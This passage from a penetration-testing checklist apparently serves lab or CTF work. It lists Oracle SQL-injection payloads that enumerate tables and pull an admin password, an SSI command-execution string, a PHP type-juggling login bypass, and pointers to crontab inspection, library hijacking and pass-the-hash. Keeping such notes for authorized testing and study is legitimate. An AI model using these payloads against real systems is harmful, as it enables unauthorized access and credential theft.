...
- [ ] list all tables:  UNION SELECT table_name, null, null from all_tables --
- [ ] list columns from web_admins: UNION SELECT column_name, null, null from all_tab_columns where table_name = 'WEB_ADMINS'--
- [ ] get admin password: UNION SELECT password, null, null from web_admins --
...
- [ ] SSI (.shtml, .stm): `<!--#exec cmd="ls" -->` (more info: https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
- [ ] XSS: 
...
- [ ] PHP Type juggling
	- [ ] if you encounter `==` in php code, you can bypass it. e.g.: `username=admin&password[]=` (see Potato writeup in 
	vulnhub https://www.infosecarticles.com/potato-1-vulnhub-walkthrough/)
...
- [ ] Crontabs: `cat /etc/crontab`
	- [ ] Check LD_LIBRARY_PATH for library hijack https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#overwriting-a-library
...
- [ ] Pass the hash: Use RC4_HMAC portion to pass the hash.
